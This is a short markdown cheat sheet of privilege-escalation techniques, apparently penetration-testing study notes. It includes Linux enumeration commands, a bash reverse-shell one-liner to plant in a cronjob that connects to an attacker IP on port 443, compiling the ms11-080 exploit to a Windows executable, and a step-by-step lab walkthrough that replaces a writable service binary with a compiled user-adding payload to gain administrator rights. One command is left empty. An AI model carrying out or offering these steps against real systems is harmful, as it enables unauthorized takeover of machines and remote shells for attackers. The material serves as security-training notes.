#Privilege Escalation

##Linux
Try the following commands to extract information about the OS
```
cat /etc/issue
uname -a
```
Then using some Googlefu you may be able to find a exploit on exploit-db.com

Check your current user privledges using `id`

If you need to open a new shell once you have root, use ``

Search for world writeable files `find / -perm -2 ! -type l -ls 2>/dev/null`

If there is a bash cronjob, add the following for reverse shell on port 443 `bash -i >& /dev/tcp/YO.UR.IP.AD/443 0>&1`

Weak services can include suid binaries, cron jobs and boot files

##Windows
On a windows box covert a python to windows executable using `pywin32` and `pyinstaller`. Running `python pyinstaller.py --onefile ms11-080.py` which will create an .exe and folder in the `dist` folder

Verify you can't perform admin functions using `net user hacker hacker /add`

Confirm your shell with `whoami`

## Weak Service Example

1. From the Windows box setup a lowpriv user (can be checked in the `computer > manage` screen)

   ```
   net user lowpriv mypass /add
   net localgroup "Remote Desktop Users" lowpriv /add
   ```

2. Install `pspro_50_3310` with default options and allow the system to reboot

3. Once rebooted connect back through RDP with your lowpriv user `root@kali:~# rdesktop -u lowpriv -p mypass WI.ND.OW.IP`

4. Access the services screen through `services.msc`

5. Take a look at the `scsiaccess` service, right click on it and select `properties`

6. Note the executable path `C:\Program Files\Photodex\ProShow Producer\ScsiAccess.exe` and navigate there using the command prompt

7. Check the permissions using `icacls ScsiAccess.exe`, this confirms if you have access to change the `.exe` for our own one

8. Compile `useradd.c` to a windows .exe using `i586-mingw32msvc-gcc useradd.c -o useradd.exe` 

9. Transfer the file to the machine

10. Move the `ScsiAccess.exe` file using `move ScsiAccess.exe ScsiAccess.exe.orig`

11. Then put our own .exe in it's place using `copy c:\users\lowpriv\Downloads\useradd.exe ScsiAccess.exe`

12. Now we just need to trigger a service restart, in this case just log back in as an administrator

13. Open the user manager window by right clicking on the computer and clicking `manage`, note the user `lowpriv` is currently not in the administrator group 

14. Restart the service (note it will report failure), however our `lowpriv` user is now in the administrator group


